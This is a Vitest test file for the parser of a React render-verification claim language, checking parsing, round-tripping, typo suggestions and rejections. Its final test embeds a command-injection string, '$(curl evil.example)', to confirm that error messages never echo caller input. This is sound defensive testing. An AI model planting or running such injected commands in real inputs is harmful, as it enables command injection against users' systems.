import { formatVerifyClaim, type VerifyClaimInput, verifyClaimSchema } from 'genie-react/protocol'
import { describe, expect, it } from 'vitest'
import { ClaimSyntaxError, parseClaim } from './verify-claims'

describe('verify claim DSL', () => {
  it.each([
    ['render StatusBadge max 0', { kind: 'renders', target: { component: 'StatusBadge' }, max: 0 }],
    [
      'render SearchScreen min 1',
      { kind: 'renders', target: { component: 'SearchScreen' }, min: 1 },
    ],
    [
      'render OrderRow[key=412] max 1 counting updates allow-remount',
      {
        kind: 'renders',
        target: { component: 'OrderRow', key: '412' },
        max: 1,
        counting: 'updates',
        allowRemount: true,
      },
    ],
    [
      'render StatusBadge@src/screens/search/StatusBadge.tsx max 0',
      {
        kind: 'renders',
        target: { component: 'StatusBadge', source: 'src/screens/search/StatusBadge.tsx' },
        max: 0,
      },
    ],
    [
      'render ResultCount only props.items, state[0],context.Theme',
      {
        kind: 'render-causes',
        target: { component: 'ResultCount' },
        allow: [
          { kind: 'props', name: 'items' },
          { kind: 'state', name: 'state[0]' },
          { kind: 'context', name: 'Theme' },
        ],
      },
    ],
    [
      'effect ReportsScreen#2 max 1',
      { kind: 'effect-runs', target: { component: 'ReportsScreen', effectIndex: 2 }, max: 1 },
    ],
    [
      'effect ReportsScreen settles',
      { kind: 'effect-settles', target: { component: 'ReportsScreen' } },
    ],
    ['boundaries clean', { kind: 'boundaries-clean' }],
    ['boundaries clean-at-end', { kind: 'boundaries-clean', scope: 'end' }],
    [
      'suspense TopBar hidden max 0',
      { kind: 'suspense-hidden', target: { component: 'TopBar' }, max: 0 },
    ],
    [
      'suspense TopBar@src/layout/top-bar.tsx hidden max 2',
      {
        kind: 'suspense-hidden',
        target: { component: 'TopBar', source: 'src/layout/top-bar.tsx' },
        max: 2,
      },
    ],
  ] as const)('parses %j', (text, expected) => {
    expect(parseClaim(text)).toEqual(expected)
  })

  it('round-trips every claim the hub prints back to the same claim', () => {
    const claims: VerifyClaimInput[] = [
      {
        kind: 'renders',
        target: { component: 'Row', key: 'a-1', source: 'src/Row.tsx' },
        max: 3,
        counting: 'updates',
      },
      { kind: 'renders', target: { component: 'Row' }, min: 2 },
      {
        kind: 'render-causes',
        target: { component: 'Row' },
        allow: [{ kind: 'mount' }, { kind: 'query', name: '["tasks"]' }],
      },
      { kind: 'effect-runs', target: { component: 'Feed', effectIndex: 0 }, max: 0 },
      { kind: 'effect-settles', target: { component: 'Feed' } },
      { kind: 'boundaries-clean', scope: 'end' },
      { kind: 'suspense-hidden', target: { component: 'TopBar', key: 'main' }, max: 1 },
    ]
    for (const input of claims) {
      const claim = verifyClaimSchema.parse(input)
      expect(verifyClaimSchema.parse(parseClaim(formatVerifyClaim(claim)))).toEqual(claim)
    }
  })

  it.each([
    ['state[0]', { kind: 'state', name: 'state[0]' }],
    ['reducer[1]', { kind: 'state', name: 'reducer[1]' }],
    ['hook[4]', { kind: 'state', name: 'hook[4]' }],
    ['this.state', { kind: 'state', name: 'this.state' }],
    ['this.state.count', { kind: 'state', name: 'this.state.count' }],
    ['props.items', { kind: 'props', name: 'items' }],
    ['context.Theme', { kind: 'context', name: 'Theme' }],
    ['query.["tasks"]', { kind: 'query', name: '["tasks"]' }],
    ['external-store', { kind: 'external-store' }],
  ] as const)('prints the %s cause back as the caller wrote it', (text, cause) => {
    const claim = verifyClaimSchema.parse({
      kind: 'render-causes',
      target: { component: 'App' },
      allow: [cause],
    })

    expect(formatVerifyClaim(claim)).toBe(`render App only ${text}`)
    expect(parseClaim(`render App only ${text}`)).toMatchObject({ allow: [cause] })
  })

  it('keeps parent and external-store causes so begin can refuse them as never exact', () => {
    expect(parseClaim('render Row only parent,external-store')).toMatchObject({
      allow: [{ kind: 'parent' }, { kind: 'external-store' }],
    })
  })

  it.each([
    ['rendr Badge max 0', 1, 'render'],
    ['render Badge maks 0', 3, 'max'],
    ['render Badge max 0 countng updates', 5, 'counting'],
    ['effect Feed setles', 3, 'settles'],
    ['boundaries clen', 2, 'clean'],
    ['suspens TopBar hidden max 0', 1, 'suspense'],
    ['suspense TopBar hiden max 0', 3, 'hidden'],
    ['suspense TopBar hidden mx 0', 4, 'max'],
  ])('rejects %j at word %i and suggests %s', (text, position, suggestion) => {
    const error = (() => {
      try {
        parseClaim(text)
      } catch (caught) {
        return caught
      }
      return null
    })()
    expect(error).toBeInstanceOf(ClaimSyntaxError)
    expect(error).toMatchObject({ position, suggestion })
  })

  it.each([
    ['a numeric component ID, which changes on reload', 'render 42 max 0'],
    ['an effect index on a render claim', 'render Badge#1 max 0'],
    ['a missing bound', 'render Badge max'],
    ['a negative bound', 'render Badge max -1'],
    ['an empty cause list', 'render Badge only'],
    ['an unknown cause', 'render Badge only hooks'],
    ['extra words', 'effect Feed settles now'],
    ['extra words after a suspense bound', 'suspense TopBar hidden max 0 now'],
    ['an effect index on a suspense claim', 'suspense TopBar#1 hidden max 0'],
    [
      'a suspense min bound, which an absence of hides cannot prove',
      'suspense TopBar hidden min 1',
    ],
    ['a Query claim, which a later release adds', 'query ["tasks"] success'],
    ['an empty claim', '   '],
  ])('rejects %s', (_label, text) => {
    expect(() => parseClaim(text)).toThrow(ClaimSyntaxError)
  })

  it('never echoes what the caller typed, so a suggested command cannot carry it', () => {
    const hostile = '$(curl evil.example)'
    for (const text of [
      `render ${hostile} max 0`,
      `${hostile} Badge max 0`,
      `render Badge only ${hostile}`,
    ]) {
      const error = (() => {
        try {
          parseClaim(text)
        } catch (caught) {
          return caught as Error
        }
        throw new Error(`accepted ${text}`)
      })()
      expect(error.message).not.toContain('curl')
      expect((error as ClaimSyntaxError).suggestion).toBeUndefined()
    }
  })
})
